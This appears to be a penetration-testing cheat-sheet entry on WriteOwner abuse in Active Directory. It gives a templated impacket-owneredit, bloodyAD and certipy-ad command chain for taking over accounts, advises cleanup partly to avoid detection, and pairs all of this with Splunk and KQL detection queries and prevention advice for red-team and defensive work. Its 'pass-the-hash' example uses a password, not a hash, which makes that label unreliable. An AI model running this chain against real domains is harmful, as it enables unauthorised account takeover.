name: impacket-owneredit (WriteOwner Abuse)
description: With WriteOwner over a user or group, take ownership of the object so you can grant yourself any ACL (GenericAll, WriteDACL, etc.). impacket-owneredit modifies the nTSecurityDescriptor Owner SID via LDAP. Once you own the object, use bloodyAD or dacledit to add GenericAll, then Shadow Credentials or password reset to take the account.
notes:
=== THE IDEA ===
WriteOwner lets you change who OWNS an AD object. Once you are the owner you
can modify the DACL - granting yourself GenericAll, then pivoting via Shadow
Credentials, password reset, or targeted Kerberoast.

=== FULL CHAIN ===
  1. Take ownership:  impacket-owneredit -action write -new-owner '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'
  2. Grant GenericAll: bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> add genericAll '<target_account>' '<user>'
  3. Pivot:            certipy-ad shadow auto -u <user>@<domain> -p <password> -account <target_account> -dc-ip <dc_ip>

=== WITH NTLM HASH (pass-the-hash) ===
  impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip <dc_ip> '<domain>/sam:NewPassword123!'

=== RESTORE ORIGINAL OWNER ===
  impacket-owneredit -action restore -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'
  (requires the backup file from the write action)

=== CLEANUP ===
Always restore original ownership after the engagement - leaving yourself as
owner of a DA account is an obvious IOC.

examples.label: Take ownership of a user object
Chain: Shadow Credentials to get NT hash

recommended.note: After taking ownership, bloodyAD grants GenericAll to complete the chain.
Shadow Credentials is the cleanest pivot once you have GenericAll.

defense.why_it_works: WriteOwner permission lets the attacker change the nTSecurityDescriptor Owner field. The object owner has implicit WriteDACL, allowing arbitrary ACE additions. This is a built-in Windows access control mechanism, not a bug.
defense.prerequisites: WriteOwner permission over the target object (visible in BloodHound as a WriteOwner edge).
defense.impact: Full control of the target object - password reset, Shadow Credentials, DCSync if the target has replication rights.
defense.detection: [MITRE T1222.001] Event 4670 (permissions change) on the target object with Owner SID modified; Event 5136 modifying nTSecurityDescriptor.
defense.artifacts: 4670 owner change event; 5136 DACL modification; impacket-owneredit backup file on attacker disk.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4670
| where isnotnull(NewSd) AND isnotnull(OldSd)
| table _time, SubjectUserName, ObjectName, ObjectType, ProcessName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4670
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, ObjectType
| where ObjectType contains "user" or ObjectType contains "group"
defense.prevention: Audit and minimize WriteOwner ACEs in AD; alert on 4670 events where the Owner SID changes to a non-admin principal; use AdminSDHolder to protect sensitive accounts.

detections.name: AD object ownership takeover
detections.logic:
SecurityEvent
| where EventID == 4670
| extend NewOwner = extract(@'O:(.+?)D:', 1, NewSd)
| where NewOwner != extract(@'O:(.+?)D:', 1, OldSd)
| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, NewOwner
detections.false_positives: Legitimate AD administration changing object ownership during delegation setup
detections.tuning: Baseline normal owner-change activity; alert on ownership changes to sensitive accounts (adminCount=1)
